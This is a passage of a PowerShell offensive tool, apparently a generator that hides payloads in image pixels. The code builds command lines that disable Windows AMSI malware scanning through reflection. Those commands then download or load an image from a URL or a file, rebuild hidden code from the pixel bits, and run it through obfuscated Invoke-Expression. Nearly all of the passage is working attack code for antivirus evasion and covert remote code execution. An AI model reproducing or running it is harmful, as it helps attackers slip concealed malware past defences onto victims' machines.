...
#>
    ...
    if ($Image) {
        ...
        $amsified = @'
        Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);
'@
        $Obufuscation = @'
        .("{0}{1}{2}"-f'se','T-iT','em') ("{2}{0}{1}" -f'iaBlE:6M','4','VaR') (  [tYpE]("{1}{2}{3}{0}"-F 'G','sY','sTEM.TEX','T.eNcodIn') ) ; .("{0}{1}"-f 'I','EX')( $6M4::"as`Cii"."Ge`Tstr`inG"(${OLICCC}[0..
'@ + $payload +"]))"
        if($WebClient) {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$oliccc=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$piccss=`$g.GetPixel(`$x,`$_);`$oliccc[`$_*$width+`$x]=([math]::Floor((`$piccss.B-band15)*16)-bor(`$piccss.G -band 15))}};" + $Obufuscation
        } elseif($PictureBox) {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$oliccc=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$piccss=`$g.GetPixel(`$x,`$_);`$oliccc[`$_*$width+`$x]=([math]::Floor((`$piccss.B-band15)*16)-bor(`$piccss.G -band 15))}};" + $Obufuscation
        } else {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$oliccc=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$piccss=`$g.GetPixel(`$x,`$_);`$oliccc[`$_*$width+`$x]=([math]::Floor((`$piccss.B-band15)*16)-bor(`$piccss.G-band15))}};`$g.Dispose();" + $Obufuscation
        }
        ...
        if($WebClient) {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$oliccc=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$piccss=`$g.GetPixel(`$x,`$_);`$oliccc[(`$_*$width+`$x)*3]=`$piccss.B;`$oliccc[(`$_*$width+`$x)*3+1]=`$piccss.G;`$oliccc[(`$_*$width+`$x)*3+2]=`$piccss.R}};"+ $Obufuscation
        } elseif($PictureBox) {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$oliccc=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$piccss=`$g.GetPixel(`$x,`$_);`$oliccc[(`$_*$width+`$x)*3]=`$piccss.B;`$oliccc[(`$_*$width+`$x)*3+1]=`$piccss.G;`$oliccc[(`$_*$width+`$x)*3+2]=`$piccss.R}};" + $Obufuscation
        } else {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$oliccc=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$piccss=`$g.GetPixel(`$x,`$_);`$oliccc[(`$_*$width+`$x)*3]=`$piccss.B;`$oliccc[(`$_*$width+`$x)*3+1]=`$piccss.G;`$oliccc[(`$_*$width+`$x)*3+2]=`$piccss.R}};`$g.Dispose();" + $Obufuscation
        }
